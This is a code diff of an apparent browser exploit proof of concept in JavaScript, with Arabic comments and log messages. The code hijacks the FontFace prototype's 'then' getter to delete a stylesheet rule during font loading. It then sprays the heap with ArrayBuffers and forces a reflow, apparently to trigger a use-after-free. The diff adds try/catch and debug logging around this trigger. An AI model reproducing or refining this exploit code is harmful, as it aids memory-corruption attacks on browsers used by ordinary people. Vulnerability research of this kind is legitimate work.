@@ -27,27 +27,35 @@
         let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
         document.fonts.add(A);
 
-        log("2. جاري تنفيذ الـ Trigger...", "yellow");
-        
-        Object.defineProperty(FontFace.prototype, 'then', {
-            configurable: true,
-            get() {
-                // تنفيذ الثغرة
-                document.getElementById('s').sheet.deleteRule(0);
-                
-                // الـ Heap Spray
-                log("3. جاري الـ Heap Spray...", "orange");
-                for (let i = 0; i < 50; i++) {
-                    spray.push(new ArrayBuffer(0x1000));
-                }
-                
-                document.body.offsetTop; // Trigger Reflow
-                log("4. تم تنفيذ الـ Reflow (اللحظة الحاسمة)...", "purple");
-                return undefined;
-            }
-        });
+        // ... (نفس هيكل الكود السابق)
 
-        document.fonts.load('1em x', 'AB');
+log("2. جاري تنفيذ الـ Trigger...", "yellow");
+
+Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get() {
+        // إشارة فورية لمعرفة هل تم استدعاء الـ Trap
+        log("DEBUG: تم الدخول للـ Getter!", "orange"); // سنغير اللون إذا دخلنا هنا
+        
+        try {
+            document.getElementById('s').sheet.deleteRule(0);
+            log("DEBUG: تم حذف القاعدة بنجاح", "orange");
+            
+            // الـ Heap Spray
+            for (let i = 0; i < 50; i++) {
+                spray.push(new ArrayBuffer(0x1000));
+            }
+            document.body.offsetTop;
+            log("4. تم تنفيذ الـ Reflow", "purple");
+        } catch(err) {
+            log("ERROR INSIDE GETTER: " + err.message, "red");
+        }
+        return undefined;
+    }
+});
+
+document.fonts.load('1em x', 'AB');
+
 
     } catch(e) {
         log("ERROR: " + e.message, "red");
